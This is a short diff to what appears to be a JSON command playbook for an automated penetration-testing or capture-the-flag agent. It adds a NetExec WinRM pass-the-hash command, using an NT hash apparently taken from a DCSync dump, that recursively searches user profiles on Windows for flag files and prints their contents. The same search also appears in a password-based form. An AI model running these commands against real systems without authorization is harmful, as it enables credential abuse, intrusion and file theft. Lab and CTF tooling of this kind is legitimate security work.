@@ -60,6 +60,11 @@
           "tool": "nxc",
           "note": "Recursively search user profiles for the well-known flag files and print each as ===FLAG:path::content through WinRM PowerShell so output is captured and parsed like every other run.",
           "run": "nxc winrm {{target}} -u {{user}} -p {{password}} -X \"foreach($f in Get-ChildItem -Path C:\\Users -Recurse -Force -Include {{flag_names_windows}} -File -ErrorAction SilentlyContinue){Write-Output ('===FLAG:'+$f.FullName+'::'+(Get-Content -Raw -LiteralPath $f.FullName -ErrorAction SilentlyContinue))}\""
+        },
+        {
+          "tool": "nxc",
+          "note": "Pass-the-hash form — when you own the account by NT hash (e.g. Administrator straight from a DCSync dump) and have no plaintext. -H takes the hash; everything else is identical.",
+          "run": "nxc winrm {{target}} -u {{user}} -H {{nthash}} -X \"foreach($f in Get-ChildItem -Path C:\\Users -Recurse -Force -Include {{flag_names_windows}} -File -ErrorAction SilentlyContinue){Write-Output ('===FLAG:'+$f.FullName+'::'+(Get-Content -Raw -LiteralPath $f.FullName -ErrorAction SilentlyContinue))}\""
         }
       ]
     }
